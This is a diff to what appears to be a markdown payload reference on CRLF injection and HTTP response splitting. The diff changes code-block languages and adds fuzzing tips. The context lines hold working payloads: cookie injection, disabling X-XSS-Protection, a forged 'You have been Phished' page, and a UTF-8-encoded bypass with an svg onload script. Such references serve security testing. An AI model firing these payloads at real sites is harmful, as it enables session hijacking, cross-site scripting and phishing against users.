@@ -16,13 +16,13 @@
 
 Requested page
 
-```powershell
+```http
 http://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue
 ```
 
 HTTP Response
 
-```powershell
+```http
 Connection: keep-alive
 Content-Length: 178
 Content-Type: text/html
@@ -45,7 +45,7 @@ http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
 
 HTTP Response
 
-```powershell
+```http
 HTTP/1.1 200 OK
 Date: Tue, 20 Dec 2016 14:34:03 GMT
 Content-Type: text/html; charset=utf-8
@@ -70,13 +70,13 @@ X-XSS-Protection:0
 
 Requested page
 
-```powershell
+```http
 http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
 ```
 
 HTTP response
 
-```powershell
+```http
 Set-Cookie:en
 Content-Length: 0
 
@@ -92,7 +92,7 @@ Content-Length: 34
 
 Using UTF-8 encoding
 
-```powershell
+```http
 %E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE
 ```
 
@@ -102,6 +102,11 @@ Remainder:
 * %E5%98%8D = %0D = \u560d
 * %E5%98%BE = %3E = \u563e (>)
 * %E5%98%BC = %3C = \u563c (<)
+
+
+## Exploitation Tricks
+* Try to search for parameters that lead to redirects and fuzz them
+* Also test the mobile version of the website, sometimes it is different or uses a different backend 
 
 ## References
 
